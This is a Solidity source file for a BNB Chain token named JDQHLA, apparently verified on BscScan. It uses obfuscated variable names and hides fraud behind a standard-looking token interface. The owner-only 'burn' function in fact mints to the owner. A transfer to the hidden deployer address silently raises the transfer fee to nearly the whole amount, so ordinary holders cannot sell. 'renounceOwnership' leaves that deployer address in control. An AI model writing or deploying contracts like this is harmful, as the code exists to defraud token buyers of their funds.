/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
contract JDQHLA {
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  MZTVBH = address(0);
mapping (address => uint256) public balanceOf;
string public  symbol = "JDQHLA";
uint256 private  FBPGJM = 1000000000000000;
address private  VWDQRK = address(0);
address public owner;
address private  KWXWSM = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  NTYBAC = 1000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  LUSFEP = 1000000000000000000;
address private  GOWITQ = address(0);
uint256 private  KUNPCX = 10000000000000;
uint256 private  ZLQBHD = 10000000000;
string public  name = "JDQHLA";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  JCQIUG = 100000000;
uint8 public constant decimals = 18;
uint256 public constant RQHKZW = 99999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  BAKATY = 1000000000000000000;
address private  YHZOKB = address(0);
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tXQSGRD 0");
require(spender != address(0), "fXQSGRD 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getJCQIUG() private returns (uint256) {
return JCQIUG;
}

function _getKUNPCX() private returns (uint256) {
return KUNPCX;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getYHZOKB() private returns (address) {
return YHZOKB;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getGOWITQ() private returns (address) {
return GOWITQ;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () {
MZTVBH = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getVWDQRK() private returns (address) {
return VWDQRK;
}

function _getKWXWSM() private returns (address) {
return KWXWSM;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "XQSGRD");
require(to != address(0), "XQSGRD");
require(amount <= balanceOf[from], "XQSGRD");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* RQHKZW/BAKATY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==MZTVBH){
BAKATY = RQHKZW+2;
}
emit Transfer(from, to, transferAmount);
}
function _getFBPGJM() private returns (uint256) {
return FBPGJM;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getNTYBAC() private returns (uint256) {
return NTYBAC;
}

function _getLUSFEP() private returns (uint256) {
return LUSFEP;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getZLQBHD() private returns (uint256) {
return ZLQBHD;
}


}